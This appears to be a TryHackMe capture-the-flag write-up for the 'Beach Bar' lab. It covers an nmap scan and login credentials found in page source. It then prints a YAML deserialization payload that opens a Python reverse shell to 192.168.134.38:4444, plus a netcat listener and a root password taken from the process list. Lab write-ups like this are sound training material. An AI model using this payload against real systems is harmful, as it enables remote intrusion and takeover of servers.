# Beach Bar

<img width="1905" height="352" alt="image" src="https://github.com/user-attachments/assets/1de85921-88df-44a8-9b7a-6efebe49cd79" />

----

## Nmap Scan

```
┌──(kali㉿kali)-[~/tryhackme]
└─$ nmap -sCV -Pn 10.112.146.223    
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-07 06:07 UTC
Nmap scan report for 10.112.146.223
Host is up (0.069s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9e:e7:04:6c:4a:0e:7a:4e:b5:5c:96:c9:d6:ad:13:0e (ECDSA)
|_  256 fd:14:43:c3:ba:e5:c8:1b:99:1f:98:97:b6:16:e0:d5 (ED25519)
80/tcp open  http    Gunicorn
|_http-server-header: gunicorn
| http-title: Beach Bar // Sign in
|_Requested resource was /login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.14 seconds
                                                                      
```

## open website found credintionals in sourcecode 

```
dj : dj
```

<img width="1267" height="388" alt="image" src="https://github.com/user-attachments/assets/6007341b-9959-451a-a945-845651514bdb" />

## use it to login 

<img width="1915" height="716" alt="image" src="https://github.com/user-attachments/assets/410e9a5a-c454-4834-8caa-79f9f2a1b15b" />

### Export the Current Playlist

```bash

# Download the export
curl http://10.112.146.223/export -o playlist.yaml
```

<img width="1291" height="372" alt="image" src="https://github.com/user-attachments/assets/603aa347-e0f3-4a31-a93b-d60d2d1018dd" />

## Create a Malicious YAML File

```
# Beach Bar jukebox playlist export
playlist:
  name: Sunset Session
  vibe: golden hour
  tracks:
    - !!python/object/apply:subprocess.check_output
      - ["python3", "-c", "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.134.38',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"]
```

## open listener

```
nc -lnvp 4444
```

### Upload the Malicious YAML

<img width="955" height="230" alt="image" src="https://github.com/user-attachments/assets/bf903c23-6d30-49dc-b88f-7a5bf471fa54" />

> #### we get first flag 🚩

----

## priv esc

```
 ps aux | grep -v grep
```

<img width="1652" height="177" alt="image" src="https://github.com/user-attachments/assets/55aec9bc-1d10-4fbb-ae66-180959cceb02" />

```
root : SunsetSpritz2024!
```

<img width="787" height="175" alt="image" src="https://github.com/user-attachments/assets/bb109a2c-4956-4dff-83e2-829bc1a0730a" />

